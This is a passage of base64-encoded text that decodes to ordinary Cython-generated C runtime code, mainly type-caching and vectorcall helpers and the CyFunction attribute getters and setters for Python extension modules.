HVsZV9kaWN0LCBweV9vYmplY3RfbmFtZSwgY2FjaGVkX3R5cGUsIDEpOwogICAgaWYgKHVubGlrZWx5KG5ld19jYWNoZWRfdHlwZSAhPSBjYWNoZWRfdHlwZSkpIHsKICAgICAgICBpZiAodW5saWtlbHkoIW5ld19jYWNoZWRfdHlwZSkpIGdvdG8gYmFkOwogICAgICAgIFB5X0RFQ1JFRihjYWNoZWRfdHlwZSk7CiAgICAgICAgY2FjaGVkX3R5cGUgPSBuZXdfY2FjaGVkX3R5cGU7CiAgICAgICAgaWYgKF9fUHl4X1ZlcmlmeUNhY2hlZFR5cGUoCiAgICAgICAgICAgICAgICBjYWNoZWRfdHlwZSwKICAgICAgICAgICAgICAgIG9iamVjdF9uYW1lLAogICAgICAgICAgICAgICAgc3BlYy0+YmFzaWNzaXplKSA8IDApIHsKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgIGdvdG8gZG9uZTsKICAgIH0gZWxzZSB7CiAgICAgICAgUHlfREVDUkVGKG5ld19jYWNoZWRfdHlwZSk7CiAgICB9CmRvbmU6CiAgICBQeV9YREVDUkVGKGFiaV9tb2R1bGUpOwogICAgUHlfREVDUkVGKHB5X29iamVjdF9uYW1lKTsKICAgIGFzc2VydChjYWNoZWRfdHlwZSA9PSBOVUxMIHx8IFB5VHlwZV9DaGVjayhjYWNoZWRfdHlwZSkpOwogICAgcmV0dXJuIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGU7CmJhZDoKICAgIFB5X1hERUNSRUYoY2FjaGVkX3R5cGUpOwogICAgY2FjaGVkX3R5cGUgPSBOVUxMOwogICAgZ290byBkb25lOwp9CgoKc3RhdGljIFB5T2JqZWN0KiBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRfbW9kdWxlKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnNlbGYsIENZVEhPTl9VTlVTRUQgdm9pZCogY29udGV4dCkgewogICAgcmV0dXJuIFB5VW5pY29kZV9Gcm9tU3RyaW5nKF9fUFlYX0FCSV9NT0RVTEVfTkFNRSk7Cn0Kc3RhdGljIFB5R2V0U2V0RGVmIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldHNldFtdID0gewogICAgeyJfX21vZHVsZV9fIiwgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZSwgTlVMTCwgTlVMTCwgTlVMTH0sCiAgICB7MCwgMCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3Nsb3RzW10gPSB7CiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldHNldH0sCiAgICB7MCwgMH0KfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3NwZWMgPSB7CiAgICBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggIl9jb21tb25fdHlwZXNfbWV0YXR5cGUiLAogICAgMCwKICAgIDAsCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwCiAgICBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEUgfAogICAgUHlfVFBGTEFHU19ESVNBTExPV19JTlNUQU5USUFUSU9OIHwKI2VuZGlmCiAgICBQeV9UUEZMQUdTX0RFRkFVTFQsCiAgICBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zbG90cwp9OwpzdGF0aWMgaW50IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2luaXQoUHlPYmplY3QgKm1vZHVsZSkgewogICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTsKICAgIFB5T2JqZWN0ICpiYXNlcyA9IFB5VHVwbGVfUGFjaygxLCAmUHlUeXBlX1R5cGUpOwogICAgaWYgKHVubGlrZWx5KCFiYXNlcykpIHsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSA9IF9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKE5VTEwsIG1vZHVsZSwgJl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3NwZWMsIGJhc2VzKTsKICAgIFB5X0RFQ1JFRihiYXNlcyk7CiAgICBpZiAodW5saWtlbHkobXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUgPT0gTlVMTCkpIHsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gMDsKfQoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7CiAgICBpZiAoIXNlbGYpCiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihmdW5jKTsKICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAgIHsKICAgICAgICBQeU9iamVjdCAqYXJnc1tdID0ge2Z1bmMsIHNlbGZ9OwogICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X1ZlY3RvcmNhbGwoX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSwgYXJncywgMiwgTlVMTCk7CiAgICB9CiAgICAjZWxzZQogICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlLCBmdW5jLCBzZWxmLCBOVUxMKTsKICAgICNlbmRpZgogICAgcmV0dXJuIHJlc3VsdDsKfQojZWxzZQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7CiAgICBpZiAoIXNlbGYpCiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihmdW5jKTsKICAgIHJldHVybiBQeU1ldGhvZF9OZXcoZnVuYywgc2VsZik7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCkKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0X2t3KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdykKewogICAgUHlPYmplY3QgKnJlcyA9IE5VTEw7CiAgICBQeU9iamVjdCAqa3duYW1lczsKICAgIFB5T2JqZWN0ICoqbmV3YXJnczsKICAgIFB5T2JqZWN0ICoqa3d2YWx1ZXM7CiAgICBQeV9zc2l6ZV90IGksIHBvczsKICAgIHNpemVfdCBqOwogICAgUHlPYmplY3QgKmtleSwgKnZhbHVlOwogICAgdW5zaWduZWQgbG9uZyBrZXlzX2FyZV9zdHJpbmdzOwogICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgUHlfc3NpemVfdCBua3cgPSBQeURpY3RfU2l6ZShrdyk7CiAgICBpZiAodW5saWtlbHkobmt3ID09IC0xKSkgcmV0dXJuIE5VTEw7CiAgICAjZWxzZQogICAgUHlfc3NpemVfdCBua3cgPSBQeURpY3RfR0VUX1NJWkUoa3cpOwogICAgI2VuZGlmCiAgICBuZXdhcmdzID0gKFB5T2JqZWN0ICoqKVB5TWVtX01hbGxvYygobmFyZ3MgKyAoc2l6ZV90KW5rdykgKiBzaXplb2YoYXJnc1swXSkpOwogICAgaWYgKHVubGlrZWx5KG5ld2FyZ3MgPT0gTlVMTCkpIHsKICAgICAgICBQeUVycl9Ob01lbW9yeSgpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgZm9yIChqID0gMDsgaiA8IG5hcmdzOyBqKyspIG5ld2FyZ3Nbal0gPSBhcmdzW2pdOwogICAga3duYW1lcyA9IFB5VHVwbGVfTmV3KG5rdyk7CiAgICBpZiAodW5saWtlbHkoa3duYW1lcyA9PSBOVUxMKSkgewogICAgICAgIFB5TWVtX0ZyZWUobmV3YXJncyk7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBrd3ZhbHVlcyA9IG5ld2FyZ3MgKyBuYXJnczsKICAgIHBvcyA9IGkgPSAwOwogICAga2V5c19hcmVfc3RyaW5ncyA9IFB5X1RQRkxBR1NfVU5JQ09ERV9TVUJDTEFTUzsKICAgIHdoaWxlIChQeURpY3RfTmV4dChrdywgJnBvcywgJmtleSwgJnZhbHVlKSkgewogICAgICAgIGtleXNfYXJlX3N0cmluZ3MgJj0KICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgICAgICBQeVR5cGVfR2V0RmxhZ3MoUHlfVFlQRShrZXkpKTsKICAgICAgICAjZWxzZQogICAgICAgICAgICBQeV9UWVBFKGtleSktPnRwX2ZsYWdzOwogICAgICAgICNlbmRpZgogICAgICAgIFB5X0lOQ1JFRihrZXkpOwogICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfU2V0SXRlbShrd25hbWVzLCBpLCBrZXkpIDwgMCkpIGdvdG8gY2xlYW51cDsKICAgICAgICAjZWxzZQogICAgICAgIFB5VHVwbGVfU0VUX0lURU0oa3duYW1lcywgaSwga2V5KTsKICAgICAgICAjZW5kaWYKICAgICAgICBrd3ZhbHVlc1tpXSA9IHZhbHVlOwogICAgICAgIGkrKzsKICAgIH0KICAgIGlmICh1bmxpa2VseSgha2V5c19hcmVfc3RyaW5ncykpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7CiAgICAgICAgZ290byBjbGVhbnVwOwogICAgfQogICAgcmVzID0gdmMoZnVuYywgbmV3YXJncywgbmFyZ3MsIGt3bmFtZXMpOwpjbGVhbnVwOgogICAgUHlfREVDUkVGKGt3bmFtZXMpOwogICAgZm9yIChpID0gMDsgaSA8IG5rdzsgaSsrKQogICAgICAgIFB5X0RFQ1JFRihrd3ZhbHVlc1tpXSk7CiAgICBQeU1lbV9GcmVlKG5ld2FyZ3MpOwogICAgcmV0dXJuIHJlczsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3cpCnsKICAgIFB5X3NzaXplX3Qga3dfc2l6ZSA9CiAgICAgICAgbGlrZWx5KGt3ID09IE5VTEwpID8KICAgICAgICAwIDoKI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIFB5RGljdF9TaXplKGt3KTsKI2Vsc2UKICAgICAgICBQeURpY3RfR0VUX1NJWkUoa3cpOwojZW5kaWYKICAgIGlmIChrd19zaXplID09IDApIHsKICAgICAgICByZXR1cm4gdmMoZnVuYywgYXJncywgbmFyZ3MsIE5VTEwpOwogICAgfQojaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBlbHNlIGlmICh1bmxpa2VseShrd19zaXplID09IC0xKSkgewogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZW5kaWYKICAgIHJldHVybiBfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0X2t3KGZ1bmMsIHZjLCBhcmdzLCBuYXJncywga3cpOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbk5vTWV0aG9kKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7CiAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVjayhmdW5jKSkgewogICAgICAgIHJldHVybiBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jOwogICAgfSBlbHNlIGlmIChQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSkgewogICAgICAgIHJldHVybiBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jOwogICAgfQogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7CiAgICBpZiAoKFB5T2JqZWN0KilQeV9UWVBFKGZ1bmMpID09IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0NhY2hlZE1ldGhvZFR5cGUpIHsKICAgICAgICBpbnQgcmVzdWx0OwogICAgICAgIFB5T2JqZWN0ICpuZXdGdW5jID0gUHlPYmplY3RfR2V0QXR0cihmdW5jLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdGdW5jKSkgewogICAgICAgICAgICBQeUVycl9DbGVhcigpOyAvLyBJdCdzIG9ubHkgYW4gb3B0aW1pemF0aW9uLCBzbyBkb24ndCB0aHJvdyBhbiBlcnJvcgogICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICB9CiAgICAgICAgcmVzdWx0ID0gX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChuZXdGdW5jLCBjZnVuYyk7CiAgICAgICAgUHlfREVDUkVGKG5ld0Z1bmMpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICByZXR1cm4gX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChmdW5jLCBjZnVuYyk7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7CiAgICBpZiAoUHlNZXRob2RfQ2hlY2soZnVuYykpIHsKICAgICAgICBmdW5jID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKGZ1bmMpOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooX19weXhfQ3lGdW5jdGlvbk9iamVjdCogZiwgUHlPYmplY3QqIGNsYXNzb2JqKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoCiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKSwKICAgICAgICAgICAgKChjbGFzc29iaikgPyBfX1B5eF9OZXdSZWYoY2xhc3NvYmopIDogTlVMTCkpOwojZWxzZQogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoCiAgICAgICAgKChQeUNNZXRob2RPYmplY3QgKikgKGYpKS0+bW1fY2xhc3MsCiAgICAgICAgKFB5VHlwZU9iamVjdCopKChjbGFzc29iaikgPyBfX1B5eF9OZXdSZWYoY2xhc3NvYmopIDogTlVMTCkpOwojZW5kaWYKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2NfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKQp7CiAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgb3AtPmZ1bmNfZG9jID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fZG9jX18iKTsKICAgICAgICBpZiAodW5saWtlbHkoIW9wLT5mdW5jX2RvYykpIHJldHVybiBOVUxMOwojZWxzZQogICAgICAgIGlmICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KilvcCktPm1fbWwtPm1sX2RvYykgewogICAgICAgICAgICBvcC0+ZnVuY19kb2MgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygoKFB5Q0Z1bmN0aW9uT2JqZWN0KilvcCktPm1fbWwtPm1sX2RvYyk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kb2MgPT0gTlVMTCkpCiAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeV9JTkNSRUYoUHlfTm9uZSk7CiAgICAgICAgICAgIHJldHVybiBQeV9Ob25lOwogICAgICAgIH0KI2VuZGlmCiAgICB9CiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZG9jKTsKICAgIHJldHVybiBvcC0+ZnVuY19kb2M7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjbG9zdXJlKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY2xvc3VyZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvY19sb2NrZWQob3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodmFsdWUgPT0gTlVMTCkgewogICAgICAgIHZhbHVlID0gUHlfTm9uZTsKICAgIH0KICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2RvYywgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWVfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKQp7CiAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfbmFtZSA9PSBOVUxMKSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIG9wLT5mdW5jX25hbWUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19uYW1lX18iKTsKI2Vsc2UKICAgICAgICBvcC0+ZnVuY19uYW1lID0gUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9uYW1lKTsKI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX25hbWUgPT0gTlVMTCkpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgUHlfSU5DUkVGKG9wLT5mdW5jX25hbWUpOwogICAgcmV0dXJuIG9wLT5mdW5jX25hbWU7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkKewogICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZV9sb2NrZWQob3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9uYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgIl9fbmFtZV9fIG11c3QgYmUgc2V0IHRvIGEgc3RyaW5nIG9iamVjdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX25hbWUsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9xdWFsbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfcXVhbG5hbWUpOwogICAgcmVzdWx0ID0gb3AtPmZ1bmNfcXVhbG5hbWU7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50Cl9fUHl4X0N5RnVuY3Rpb25fc2V0X3F1YWxuYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgIl9fcXVhbG5hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19xdWFsbmFtZSwgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3RfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKQp7CiAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZGljdCA9PSBOVUxMKSkgewogICAgICAgIG9wLT5mdW5jX2RpY3QgPSBQeURpY3RfTmV3KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgUHlfSU5DUkVGKG9wLT5mdW5jX2RpY3QpOwogICAgcmV0dXJuIG9wLT5mdW5jX2RpY3Q7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0X2xvY2tlZChvcCk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50Cl9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAiZnVuY3Rpb24ncyBkaWN0aW9uYXJ5IG1heSBub3QgYmUgZGVsZXRlZCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIGlmICh1bmxpa2VseSghUHlEaWN0X0NoZWNrKHZhbHVlKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAic2V0dGluZyBmdW5jdGlvbidzIGRpY3Rpb25hcnkgdG8gYSBub24tZGljdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2RpY3QsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19nbG9iYWxzKTsKICAgIHJldHVybiBvcC0+ZnVuY19nbG9iYWxzOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Nsb3N1cmUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKG9wKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgcmV0dXJuIFB5X05vbmU7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkKewogICAgUHlPYmplY3QqIHJlc3VsdCA9IChvcC0+ZnVuY19jb2RlKSA/IG